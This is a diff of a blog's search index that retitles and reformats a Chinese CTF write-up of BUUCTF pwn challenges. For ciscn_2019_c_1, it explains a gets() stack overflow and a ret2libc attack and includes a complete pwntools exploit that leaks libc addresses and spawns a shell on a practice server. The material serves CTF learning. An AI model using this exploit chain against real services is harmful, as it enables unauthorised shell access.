@@ -733,9 +733,10 @@
       </tags>
   </entry>
   <entry>
-    <title>not_the_same_3dsctf_2016</title>
+    <title>远古BUUCTF的wp</title>
     <url>/posts/de339b6d/</url>
     <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p>搬运，BUUCTF的pwn部分题解</p>
+<p>[toc]</p>
 <span id="more"></span>
 
 <h1 id="not-the-same-3dsctf-2016"><a href="#not-the-same-3dsctf-2016" class="headerlink" title="not_the_same_3dsctf_2016"></a>not_the_same_3dsctf_2016</h1><h2 id="0X01"><a href="#0X01" class="headerlink" title="0X01"></a>0X01</h2><p>和get_started_3dsctf_2016类似</p>
@@ -818,20 +819,20 @@
 
 <h2 id="0x04"><a href="#0x04" class="headerlink" title="0x04"></a>0x04</h2><p>参考文章</p>
 <p><a href="https://blog.csdn.net/tbsqigongzi/article/details/124457938?spm=1001.2014.3001.5501">1</a>    <a href="https://blog.csdn.net/qq_15762939/article/details/104062307">2</a>  <a href="https://niceseven.github.io/post/2020/02/11/buuctf-pwn-get_started_3dsctf_2016/">3</a>  <a href="http://liul14n.top/2020/02/25/get-started-3dsctf-2016/">4</a>  <a href="https://www.shawroot.cc/2010.html">5</a>  <a href="https://blog.csdn.net/A951860555/article/details/111030289">6</a></p>
-<h1 id="ciscn-2019-c-1"><a href="#ciscn-2019-c-1" class="headerlink" title="ciscn_2019_c_1"></a>ciscn_2019_c_1</h1><h3 id="0x01-1"><a href="#0x01-1" class="headerlink" title="0x01"></a>0x01</h3><p>简单的ret2libc3<br>file checksec —— 64-bit 开NX</p>
-<h3 id="0x02-2"><a href="#0x02-2" class="headerlink" title="0x02"></a>0x02</h3><p>运行一下看看</p>
+<h1 id="ciscn-2019-c-1"><a href="#ciscn-2019-c-1" class="headerlink" title="ciscn_2019_c_1"></a>ciscn_2019_c_1</h1><h2 id="0x01-1"><a href="#0x01-1" class="headerlink" title="0x01"></a>0x01</h2><p>简单的ret2libc3<br>file checksec —— 64-bit 开NX</p>
+<h2 id="0x02-2"><a href="#0x02-2" class="headerlink" title="0x02"></a>0x02</h2><p>运行一下看看</p>
 <p><img data-src="https://raw.githubusercontent.com/lmarch2/images/main/typora/202308071915622.webp"></p>
 <p>再看看IDA</p>
 <p><img data-src="https://img-blog.csdnimg.cn/2020082517155968.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L21jbXV5YW5nYQ==,size_16,color_FFFFFF,t_70#pic_center"></p>
 <p>研究了半天发现是让你加解密的<br>再看看string window 没用system和binsh<br>又发现加密函数里有gets函数，可构成栈溢出</p>
 <p><img data-src="https://raw.githubusercontent.com/lmarch2/images/main/typora/202308071915382.png"></p>
-<h3 id="0x03-1"><a href="#0x03-1" class="headerlink" title="0x03"></a>0x03</h3><p>分析大致流程就是</p>
+<h2 id="0x03-1"><a href="#0x03-1" class="headerlink" title="0x03"></a>0x03</h2><p>分析大致流程就是</p>
 <ol>
 <li>利用一个程序已经执行过的函数去泄露它在程序中的地址，然后取末尾3个字节，去找到这个程序所使用的libc的版本</li>
 <li>用同一个程序里函数的地址-libc里的函数地址即可得到偏移量</li>
 <li>得到偏移量后就可以推算出程序中其他函数的地址，知道其他函数的地址之后就可以去执行system（’&#x2F;bin&#x2F;sh‘）</li>
 </ol>
-<h3 id="0x04-1"><a href="#0x04-1" class="headerlink" title="0x04"></a>0x04</h3><p>写exp</p>
+<h2 id="0x04-1"><a href="#0x04-1" class="headerlink" title="0x04"></a>0x04</h2><p>写exp</p>
 <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span>*</span><br><span class="line"></span><br><span class="line">p=remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">28342</span>)</span><br><span class="line">elf=ELF(<span class="string">&#x27;./ciscn_2019_c_1&#x27;</span>)</span><br><span class="line"></span><br><span class="line">main=<span class="number">0x400b28</span></span><br><span class="line">pop_rdi=<span class="number">0x400c83</span></span><br><span class="line">ret=<span class="number">0x4006b9</span></span><br><span class="line"></span><br><span class="line">puts_plt=elf.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">puts_got=elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;choice!\n&#x27;</span>,<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">payload=<span class="string">&#x27;\0&#x27;</span>+<span class="string">&#x27;a&#x27;</span>*(<span class="number">0x50</span>-<span class="number">1</span>+<span class="number">8</span>)</span><br><span class="line">payload+=p64(pop_rdi)</span><br><span class="line">payload+=p64(puts_got)</span><br><span class="line">payload+=p64(puts_plt)</span><br><span class="line">payload+=p64(main)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;encrypted\n&#x27;</span>,payload)</span><br><span class="line">p.recvline()</span><br><span class="line">p.recvline()</span><br><span class="line"></span><br><span class="line">puts_addr=u64(r.recvuntil(<span class="string">&#x27;\n&#x27;</span>)[:-<span class="number">1</span>].ljust(<span class="number">8</span>,<span class="string">&#x27;\0&#x27;</span>))</span><br><span class="line"><span class="built_in">print</span> <span class="built_in">hex</span>(puts_addr)</span><br><span class="line"></span><br><span class="line">libc=LibcSearcher(<span class="string">&#x27;puts&#x27;</span>,puts_addr)</span><br><span class="line">offset=puts_addr-libc.dump(<span class="string">&#x27;puts&#x27;</span>)</span><br><span class="line">binsh=offset+libc.dump(<span class="string">&#x27;str_bin_sh&#x27;</span>)</span><br><span class="line">system=offset+libc.dump(<span class="string">&#x27;system&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;choice!\n&#x27;</span>,<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload=<span class="string">&#x27;\0&#x27;</span>+<span class="string">&#x27;a&#x27;</span>*(<span class="number">0x50</span>-<span class="number">1</span>+<span class="number">8</span>)</span><br><span class="line">payload+=p64(ret)</span><br><span class="line">payload+=p64(pop_rdi)</span><br><span class="line">payload+=p64(binsh)</span><br><span class="line">payload+=p64(system)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;encrypted\n&#x27;</span>,payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
 <h2 id="0x05"><a href="#0x05" class="headerlink" title="0x05"></a>0x05</h2><p><a href="https://github.com/lieanu/LibcSearcher">libcsearch</a>的github网址<br>安装</p>
 <blockquote>
